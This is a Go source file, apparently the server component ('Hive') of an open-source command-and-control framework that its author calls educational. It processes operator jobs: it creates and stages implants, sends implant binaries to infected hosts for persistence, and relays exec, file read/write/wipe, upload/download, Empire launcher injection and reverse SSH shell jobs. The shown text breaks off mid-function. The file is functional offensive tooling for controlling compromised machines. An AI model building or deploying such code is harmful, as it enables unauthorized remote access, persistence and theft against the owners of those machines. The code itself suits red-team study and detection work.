//{{{{{{{ Hive Jobs Functions }}}}}}}

//// Every command related orders sent to Hive from Clients or console Input and their crafting/process
// A. console
// B. rinteract
// C. binteract
// D. ...

//By Rebujacker - Alvaro Folgado Rueda as an open source educative project

package main

import (


	"os/exec"
	"fmt"
	"strings"
	"bytes"
	"time"
	"encoding/json"
    "io/ioutil"
    "encoding/base64"

)


////Commands JSON, will fit in Job "parameter" field

//CreateImplant
type CreateImplant struct {
	Offline string `json:"offline"`
    Name string   `json:"name"`
    Ttl string   `json:"ttl"`
    Resptime string   `json:"resptime"`
    Coms string   `json:"coms"`
    ComsParams []string `json:"comsparams"`
    PersistenceOsx string `json:"persistenceosx"`
    PersistenceOsxP string `json:"persistenceosxp"`
    PersistenceWindows string `json:"persistencewindows"`
    PersistenceWindowsP string `json:"persistencewindowsp"`
    PersistenceLin string `json:"persistencelinux"`
    PersistenceLinP string `json:"persistencelinuxp"`
    Redirectors  []Red `json:"redirectors"`
}


type Red struct{
    Vps string `json:"vps"`
    Domain string `json:"domain"`
}

//Inject Shell
type InjectEmpire struct {
    Staging string   `json:"staging"`
}


type InjectRevSshShellBichito struct {
    Domain string   `json:"domain"`
    Sshkey string   `json:"sshkey"`
    Port string   `json:"port"`
    User string   `json:"user"`
}


// Drop Implant to Droplet
type DropImplant struct {
	Implant string   `json:"implant"`
    Staging string   `json:"staging"`
    Os string   `json:"os"`
    Arch string   `json:"arch"`
    Filename string   `json:"filename"`
}


//Deletes
type DeleteImplant struct{
    Name string `json:"name"`
}

type DeleteVps struct{
    Name string `json:"name"`
}

type DeleteDomain struct{
    Name string `json:"name"`
}

type DeleteStaging struct{
    Name string `json:"name"`
}


//Implant Checking,future use for gather information of bot
type BiChecking struct{
    Hostname string `json:"hostname"`
}

//Hive Operations
type AddOperator struct {
    Username string   `json:"username"`
    Password string   `json:"password"`
}




func jobProcessor(jobO *Job){

	cid := jobO.Cid
	pid := jobO.Pid
	chid := jobO.Chid
	jid := jobO.Jid
	job := jobO.Job
	parameters := jobO.Parameters
	fmt.Println(job+parameters)
	if strings.Contains(pid,"Hive"){

		switch job{
			case "createImplant":

    			jsconcommanA := make([]CreateImplant, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createImplant(Command JSON Decoding Error):"+errD.Error())
					return
    			}

    			//Server Side white-list for Hive Commands
    			if !(namesInputWhite(commandO.Name) && numbersInputWhite(commandO.Ttl) && numbersInputWhite(commandO.Resptime) && 
    				 namesInputWhite(commandO.Coms)){

					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createImplant(Implant "+commandO.Name+" Incorrect Param. Formatting)")
					return
    			}

    			//Decode VPC by type and do formatting check
				switch commandO.Coms{

					case "selfsignedhttpsgo":
						//Check Network Module Parameters formatting
						if !tcpPortInputWhite(commandO.ComsParams[0]) {
							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"Hive-Create Implant(Paranoid Https TCP Port incorrect)")
							return
							}
							
					case "paranoidhttpsgo":
						//Check Network Module Parameters formatting
						if !tcpPortInputWhite(commandO.ComsParams[0]) {
							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"Hive-Create Implant(Paranoid Https TCP Port incorrect)")
							return
							}

					case "gmailgo":
					case "gmailmimic":


					default:
						setJobStatusDB(jid,"Error")
						setJobResultDB(jid,"Hive-Create Implant(Netowrk Module yet not Implemented)")
						return
				}

				existV,_ := existImplantDB(commandO.Name)
				if existV{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createImplant(Implant "+commandO.Name+" Already exists)")
					return
				}

				errI := createImplant(commandO.Offline,commandO.Name,commandO.Ttl,commandO.Resptime,commandO.Coms,commandO.ComsParams,commandO.PersistenceOsx,commandO.PersistenceOsxP,commandO.PersistenceWindows,commandO.PersistenceWindowsP,commandO.PersistenceLin,commandO.PersistenceLinP,commandO.Redirectors)
				
				if errI != ""{
					removeImplant(commandO.Name)
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createImplant("+errI+")")
					return
				}else{
					setJobStatusDB(jid,"Success")
					setJobResultDB(jid,"Hive-createImplant("+commandO.Name+" created)")
					return
				}
			case "deleteImplant":
    			jsconcommanA := make([]DeleteImplant, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createImplant("+commandO.Name+" created)")
					return
    			}

    			//Server Side white-list for Hive Commands
    			if !namesInputWhite(commandO.Name){
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteImplant(Implant "+commandO.Name+" Incorrect Param. Formatting)")
					return
    			}

				existI,_ := existImplantDB(commandO.Name)
				if !existI{
					setJobStatusDB(jid,"Error:Hive-deleteImplant(Implant Not in DB)")
					return
				}

				err := removeImplant(commandO.Name)
				if err != "Done"{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Error:Hive-deleteImplant("+err+")")
					return
				}
				setJobStatusDB(jid,"Success")
				setJobResultDB(jid,"Hive-deleteImplant(Implant "+commandO.Name+" Deleted)")
				return

			case "createVPS":

    			resultA := make([]Vps, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&resultA)
    			result := resultA[0]
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"createVPS(VPS JSON Decoding Error)")
					return
    			}


    			//Decode VPC by type and do formatting check
				switch result.Vtype{

					case "aws_instance":
						var amazon *Amazon
						errDaws := json.Unmarshal([]byte(result.Parameters), &amazon)
						if errDaws != nil {
							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"VPC Add(Amazon Parameters Decoding Error):"+errDaws.Error())
							return
						}

    					if !(accessKeysInputWhite(result.Name) && accessKeysInputWhite(amazon.Accesskey) && 
    						accessKeysInputWhite(amazon.Secretkey) && accessKeysInputWhite(amazon.Region) && 
    						namesInputWhite(amazon.Sshkeyname) && accessKeysInputWhite(amazon.Ami) && rsaKeysInputWhite(amazon.Sshkey)){
							
							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"Hive-VPC Add(VPC Amazon Incorrect Param. Formatting)")
							return
    					}

					default:
						setJobStatusDB(jid,"Error")
						setJobResultDB(jid,"Hive-VPC Add(VPC Type not yet Implemented)")
						return
				}


				existV,_ := existVpsDB(result.Name)
				if existV{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Error:createVPS(VPS "+result.Name+" Already exists)")
					return
				}

				addVpsDB(&result)
				setJobStatusDB(jid,"Success")
				setJobResultDB(jid,"createVPS(VPS "+result.Name+" Created)")
				return

			case "deleteVPS":
    			
    			jsconcommanA := make([]DeleteVps, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteVPS(Command JSON Decoding Error))")
					return
    			}

    			//Server Side white-list for Hive Commands
    			if !namesInputWhite(commandO.Name){
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteVPC(VPC "+commandO.Name+" Incorrect Param. Formatting)")
					return
    			}

				existV,_ := existVpsDB(commandO.Name)
				if !existV{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteVPS(VPS not in DB)")
					return
				}

				rmVpsDB(commandO.Name)
				setJobStatusDB(jid,"Success")
				setJobResultDB(jid,"Hive-deleteVPS(VPS "+commandO.Name+" Deleted)")
				return

			case "createDomain":
    			
				// JSON parse input
    			resultA := make([]Domain, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&resultA)
    			commandO := resultA[0]
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createDomain(JSON Decoding Error)")
					return
    			}

    			//Decode Domain by type and do formatting check
				switch commandO.Dtype{

					case "godaddy":
						var godaddy *Godaddy
						errDaws := json.Unmarshal([]byte(commandO.Parameters), &godaddy)
						if errDaws != nil {
							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"Domain Add(Godaddy Parameters Decoding Error):"+errDaws.Error())
							return
						}

    					if !(namesInputWhite(commandO.Name) && domainsInputWhite(commandO.Domain) && 
    						accessKeysInputWhite(godaddy.Domainkey) && accessKeysInputWhite(godaddy.Domainsecret)){
							
							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"Hive-Domain Add(Domain GoDaddy Incorrect Param. Formatting)")
							return
    					}

    				case "gmail":
						var gmail *Gmail
						errDaws := json.Unmarshal([]byte(commandO.Parameters), &gmail)
						if errDaws != nil {
							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"Domain Add(GoogleParameters Decoding Error):"+errDaws.Error())
							return
						}

						//Let's create a fake domain for gmail SAAS so it doesn't give problems on Hive checking auth
						commandO.Domain = commandO.Domain + ".com"
    					if !(namesInputWhite(commandO.Name) && domainsInputWhite(commandO.Domain) && gmailInputWhite(gmail.Creds) && 
    						gmailInputWhite(gmail.Token)){

							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"Hive-Domain Add(SAAS Gmail Incorrect Param. Formatting)")
							return
    					}
					default:
						setJobStatusDB(jid,"Error")
						setJobResultDB(jid,"Hive-Domain Add(Domain Type not yet Implemented)")
						return
				}

				existV,_ := existDomainDB(commandO.Name)
				if existV{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createDomain(Domain already exists)")
					return
				}

				addDomainDB(&commandO)
				setJobStatusDB(jid,"Success")
				setJobResultDB(jid,"Hive-createDomain(Domain "+commandO.Name+"Created)")
				return

			case "deleteDomain":
    			
    			jsconcommanA := make([]DeleteDomain, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteDomain(Command JSON Decoding Error)")
					return
    			}

    			//Server Side white-list for Hive Commands
    			if !namesInputWhite(commandO.Name){
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteDomain(Domain "+commandO.Name+" Incorrect Param. Formatting)")
					return
    			}

				existV,_ := existDomainDB(commandO.Name)
				if !existV{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteDomain(Domain Exists)")
					return
				}

				rmDomainDB(commandO.Name)
				setJobStatusDB(jid,"Success")
				setJobResultDB(jid,"Hive-deleteDomain(Domain "+commandO.Name+" Deleted)")
				return

			case "createStaging":

    			jsconcommanA := make([]Staging, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createStaging(Command JSON Decoding Error)")
					return
   				}

    			//Decode Staging by type and do formatting check
				switch commandO.Stype{

					case "https_droplet_letsencrypt":
						var droplet *Droplet
						errDaws := json.Unmarshal([]byte(commandO.Parameters), &droplet)
						if errDaws != nil {
							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"Staging Add(Droplet Parameters Decoding Error):"+errDaws.Error())
							return
						}

    					if !(namesInputWhite(commandO.Name) && namesInputWhite(commandO.VpsName) && 
    						namesInputWhite(commandO.DomainName) && tcpPortInputWhite(droplet.HttpsPort) && 
    						namesInputWhite(droplet.Path)){

							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"Staging Add(Droplet Incorrect Param. Formatting)")
							return
    					}

    				case "https_msft_letsencrypt":
						var msf *Msf
						errDaws := json.Unmarshal([]byte(commandO.Parameters), &msf)
						if errDaws != nil {
							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"Staging Add(MSFT Parameters Decoding Error):"+errDaws.Error())
							return
						}

    					if !(namesInputWhite(commandO.Name) && namesInputWhite(commandO.VpsName) && 
    						namesInputWhite(commandO.DomainName) && tcpPortInputWhite(msf.HttpsPort)){

							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"Staging Add(MSFT Incorrect Param. Formatting)")
							return
    					}

    				case "https_empire_letsencrypt":
						var empire *Empire
						errDaws := json.Unmarshal([]byte(commandO.Parameters), &empire)
						if errDaws != nil {
							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"Staging Add(MSFT Parameters Decoding Error):"+errDaws.Error())
							return
						}

    					if !(namesInputWhite(commandO.Name) && namesInputWhite(commandO.VpsName) && 
    						namesInputWhite(commandO.DomainName) && tcpPortInputWhite(empire.HttpsPort)){

							setJobStatusDB(jid,"Error")
							setJobResultDB(jid,"Staging Add(MSFT Incorrect Param. Formatting)")
							return
    					}
    				case "ssh_rev_shell":


					default:
						setJobStatusDB(jid,"Error")
						setJobResultDB(jid,"Staging Add(Staging Type not yet Implemented)")
						return
				}	


				existV,_ := existStagingDB(commandO.Name)
				if existV{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createStaging(Staging exists)")
					return
				}

				errI := createStaging(commandO.Name,commandO.Stype,commandO.Parameters,commandO.VpsName,commandO.DomainName)

				if errI != ""{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createStaging(Staging "+errI+" Error)")
					removeStaging(commandO.Name)
					return
				}else{
					setJobStatusDB(jid,"Success")
					setJobResultDB(jid,"Hive-createStaging(Staging "+commandO.Name+" created)")
					return
				}

			case "deleteStaging":
    			
    			jsconcommanA := make([]DeleteStaging, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteStaging(Command JSON Decoding Error)")
					return
    			}


    			//Server Side white-list for Hive Commands
    			if !namesInputWhite(commandO.Name){
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteStaging(Staging "+commandO.Name+" Incorrect Param. Formatting)")
					return
    			}

				existI,_ := existStagingDB(commandO.Name)
				if !existI{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-deleteStaging(Staging doesn't exists)")
					return
				}
				removeStaging(commandO.Name)
				setJobStatusDB(jid,"Succes")
				setJobResultDB(jid,"Hive-deleteStaging(Staging "+commandO.Name+" deleted)")
				return

			case "dropImplant":
    			
    			jsconcommanA := make([]DropImplant, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-dropImplant(Command JSON Decoding Error)")
					return
    			}

				existI,_ := existStagingDB(commandO.Staging)
				if !existI{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-dropImplant(Staging doesn't exists)")
					return
				}

				stagingO := getStagingDB(commandO.Staging)
				//fmt.Println(strings.Contains(stagingO.Stype,"droplet"))
				if !strings.Contains(stagingO.Stype,"droplet"){
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-dropImplant(Staging is not a Droplet)")
					return
				}

				var droplet *Droplet
				errD = json.Unmarshal([]byte(stagingO.Parameters), &droplet)
				if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-dropImplant(Problem Decoding Staging Droplet Object Parameters)")
   	 				return
				}
				
    			//Server Side white-list for Hive Commands
    			if !(namesInputWhite(commandO.Implant) && namesInputWhite(commandO.Staging) && namesInputWhite(stagingO.DomainName) && 
    				namesInputWhite(droplet.Path) && namesInputWhite(commandO.Os) && namesInputWhite(commandO.Arch) && 
    				namesInputWhite(commandO.Filename)){

					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-dropImplant(Drop "+commandO.Implant+" Incorrect Param. Formatting)")
					return
    			}

				errI := dropImplant(commandO.Implant,commandO.Staging,stagingO.DomainName,droplet.Path,commandO.Os,commandO.Arch,commandO.Filename)
				if errI != ""{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-dropImplant(Drop Implant "+errI+" Error)")
					return
				}else{
					setJobStatusDB(jid,"Success")
					setJobResultDB(jid,"Hive-dropImplant(Drop Implant: "+stagingO.DomainName+":"+droplet.HttpsPort+"/"+droplet.Path+"/"+commandO.Filename+" created)")
					return
				}

			case "createReport":

    			jsconcommanA := make([]Report, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createReport(Command JSON Decoding Error)")
					return
   				}

    			//Server Side white-list for Hive Commands
    			if !namesInputWhite(commandO.Name){
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createReport(Report "+commandO.Name+" Incorrect Param. Formatting)")
					return
    			}   				

				existV,_ := existReportDB(commandO.Name)
				if existV{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createReport(Report exists)")
					return
				}

				errI := createReport(commandO.Name)

				if errI != ""{
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-createReport(Report "+errI+" Error)")
					removeStaging(commandO.Name)
					return
				}else{
					setJobStatusDB(jid,"Success")
					setJobResultDB(jid,"Hive-createReport(Report "+commandO.Name+" created)")
					return
				}

			case "addOperator":

    			jsconcommanA := make([]AddOperator, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-addOperator(Command JSON Decoding Error)")
					return
   				}

   				//Debug
   				//fmt.Println("CID:"+cid)
   				//fmt.Println("Is admin??:"+isUserAdminDB(jobO.Cid))

   				if isUserAdminDB(jobO.Cid) != "Yes"{
   					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-addOperator(Is not Admin User)")
					return
   				}


   				err,_ := addUser(commandO.Username,commandO.Password)
    			if err != "" {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Hive-addOperator(Error adding new user to DB):"+err)
					return
   				}


			default:
				setJobStatusDB(jid,"Error")
				setJobResultDB(jid,"Hive-JobNotImplemented")
				return
		}

	}else if strings.Contains(pid,"R-") && strings.Contains(chid,"None"){

		switch job{

			case "log":
   				jsconcommanA := make([]Log, 0)
   				decoder := json.NewDecoder(bytes.NewBufferString(parameters))
   				errD := decoder.Decode(&jsconcommanA)
   				// Error Log
    			if errD != nil {
    				time := time.Now().Format("02/01/2006 15:04:05 MST")
					elog := fmt.Sprintf("Job by "+pid+":Redirector Log(JSON Decoding Error)"+errD.Error())
					addLogDB("Hive",time,elog)
					return
   				}
   				commandO := jsconcommanA[0]
				addLogDB(pid,commandO.Time,commandO.Error)
				return
			default:
				time := time.Now().Format("02/01/2006 15:04:05 MST")
				elog := fmt.Sprintf("Job by "+cid+":Redirector(Job not implemented)")
				addLogDB(pid,time,elog)
		}
	}else if strings.Contains(chid,"B-"){
	
		switch job{

			//Deprecated, BiPing can do everything
			case "BiChecking":

   				//BiCHecking is a encoded bot info for future use
   				biChecking(chid,pid,parameters)
				jobsreceived := &Job{"","",pid,chid,"received","","","",""}
				
				jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsreceived)
				jobsToProcess.mux.Unlock()

   				time := time.Now().Format("02/01/2006 15:04:05 MST")
   				setRedLastCheckedDB(pid,time)
   				setBiLastCheckedbyBidDB(chid,time)
   				setBiRidDB(chid,pid)
				return

			//Main Beacon of Implants, will be used to Update the bot and its redirector
			case "BiPing":

				existB,_ := existBiDB(chid)
				if !existB{
					biChecking(chid,pid,parameters)
				}

				//Check SysInfo, if empty, craft a new Job to retrieve it
				bichito := getBichitoDB(chid)
				if (bichito.Info == "") {
					//fmt.Println("Adding Sysinfo...")
   				
					jobsysinfo := &Job{"","",pid,chid,"sysinfo","","Processing","",""}

					jobsToProcess.mux.Lock()
					jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsysinfo)
					jobsToProcess.mux.Unlock()
				}

				//Debug:
				//fmt.Println("Adding Received...")
				jobsreceived := &Job{"","",pid,chid,"received","","","",""}

				jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsreceived)
				jobsToProcess.mux.Unlock()

   				time := time.Now().Format("02/01/2006 15:04:05 MST")
   				setRedLastCheckedDB(pid,time)
   				setBiLastCheckedbyBidDB(chid,time)
   				setBiRidDB(chid,pid)
				return
			case "log":
				
				existB,_ := existBiDB(chid)
				if !existB{
					biChecking(chid,pid,parameters)
				}

   				jsconcommanA := make([]Log, 0)
   				decoder := json.NewDecoder(bytes.NewBufferString(parameters))
   				errD := decoder.Decode(&jsconcommanA)
   				// Error Log
    			if errD != nil {
    				time := time.Now().Format("02/01/2006 15:04:05 MST")
					elog := fmt.Sprintf("Job by "+chid+":Bichito Log(Log JSON Decoding Error)"+errD.Error())
					addLogDB("Hive",time,elog)
					return
   				}
   				commandO := jsconcommanA[0]
				addLogDB(chid,commandO.Time,commandO.Error)

				time := time.Now().Format("02/01/2006 15:04:05 MST")
   				setRedLastCheckedDB(pid,time)
   				setBiLastCheckedbyBidDB(chid,time)
   				setBiRidDB(chid,pid)
				return
			
			////Jobs Triggered by users
			//Implant Lifecycle
			
			case "respTime":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return

			case "ttl":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return

			//Get target Implant and send it for bichito persistence
			case "persistence":

				existB,_ := existBiDB(chid)
				if !existB{
					biChecking(chid,pid,parameters)
				}

				//Check SysInfo, if empty, craft a new Job to retrieve it
				bichito := getBichitoDB(chid)
				if (bichito.Info == "") {
   				
					jobsysinfo := &Job{"","",pid,chid,"sysinfo","","Sending","",""}

					jobsToProcess.mux.Lock()
					jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsysinfo)
					jobsToProcess.mux.Unlock()
					return
				}

				//Parse sysinfo and get target OS and architecture
				var biInfo *SysInfo
				errDaws := json.Unmarshal([]byte(bichito.Info),&biInfo)
				if errDaws != nil {
    				time := time.Now().Format("02/01/2006 15:04:05 MST")
					elog := fmt.Sprintf("Job by "+chid+":Bichito Log(Log JSON Decoding Error)"+errDaws.Error())
					addLogDB("Hive",time,elog)
					return
				}

				//Need to fix this one to just detect "COmpiled for String --> Compiled for x64: Intel x86-64h Haswell"
				compiledFor := strings.Split(biInfo.Arch,":")[0]
				x64 := strings.Contains(compiledFor,"64")
				x32 := strings.Contains(compiledFor,"86")

				windows := strings.Contains(biInfo.Os,"windows")
				linux := strings.Contains(biInfo.Os,"linux")
				darwin := strings.Contains(biInfo.Os,"darwin")

				var implantPath string

				switch{
					case (x32 && windows):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx32"
					case (x64 && windows):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx64"
					case (x32 && linux):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoLinuxx32"
					case (x64 && linux):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoLinuxx64"
					case (x32 && darwin):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoOSXx32"
					case (x64 && darwin):
						implantPath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoOSXx64"
					default:
					    time := time.Now().Format("02/01/2006 15:04:05 MST")
						elog := fmt.Sprintf("Error in persistence for: "+chid+" no executablePath found.")
						addLogDB("Hive",time,elog)
						return	
				}


        		//Get Target Implant
        		implant, err := ioutil.ReadFile(implantPath)
        		if err != nil {
    				time := time.Now().Format("02/01/2006 15:04:05 MST")
					elog := fmt.Sprintf("Persistence by "+chid+": Error reading implant"+err.Error())
					addLogDB("Hive",time,elog)
					return
        		}

        		//Set the output of the file on "Result"
        		jobO.Result = base64.StdEncoding.EncodeToString(implant)

    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()

				return

			case "removeInfection":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return

			case "kill":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			
			//Implant Basic Capabilities
			case "sysinfo":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			
			case "exec":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			
			case "ls":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			
			case "accesschk":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			
			case "read":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			

			case "write":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			

			case "wipe":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			

			case "upload":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return
			

			case "download":
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return

			
			//Staging/POST Actions
			case "injectEmpire":

				//Get staging
				//from staging: type,port,domain
    			jsconcommanA := make([]InjectEmpire, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Implant-injectEmpire(Command JSON Decoding Error)")
					return
    			}

				//Generate target shellcode
				error,launcher := getEmpireLauncher(commandO.Staging,chid)
    			if error != "" {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Implant-injectEmpire(Generate Launcher error):"+error)
					return
    			}

				jobO.Parameters = launcher
				//Lock shared Slice
    			jobsToProcess.mux.Lock()
    			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return

			case "injectRevSshShell":

				//Get staging
				//from staging: type,port,domain
    			jsconcommanA := make([]InjectEmpire, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Implant-injectEmpire(Command JSON Decoding Error)")
					return
    			}

    			domain,err1,err2 := getDomainbyStagingDB(commandO.Staging)
    			if (err1 != nil) || (err2 != nil) {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Implant-injectRevSshShell(Get Staging Domain):"+err1.Error()+err2.Error())
					return
    			}


    			///usr/local/STHive/stagings/%s/implantkey

    			sshkey, err := ioutil.ReadFile("/usr/local/STHive/stagings/"+commandO.Staging+"/implantkey")
    			if err != nil {
        			//ErrorLog
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Implant-injectRevSshShell(Reading Anonymous Staging Key):"+err1.Error()+err2.Error())
        			return
    			}

    			//Debug
    			//fmt.Println("ImplantKey: "+string(sshkey) + "Domain: "+domain)

    			//JSON Encode function params 
    			revssshellhparams := InjectRevSshShellBichito{domain,string(sshkey),"22","anonymous"}
				bufBP := new(bytes.Buffer)
				json.NewEncoder(bufBP).Encode(revssshellhparams)
				resultBP := bufBP.String()

				jobO.Parameters = resultBP
				

				//Lock shared Slice
    			jobsToProcess.mux.Lock()
    			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
				jobsToProcess.mux.Unlock()
				return

			case "injectRevSshShellOffline":

				//Get staging
				//from staging: type,port,domain
    			
				
    			jsconcommanA := make([]InjectRevSshShellBichito, 0)
    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
    			errD := decoder.Decode(&jsconcommanA)
    			commandO := jsconcommanA[0]
    			// Error Log
    			if errD != nil {
					setJobStatusDB(jid,"Error")
					setJobResultDB(jid,"Implant-injectEmpire(Command JSON Decoding Error)")
					return
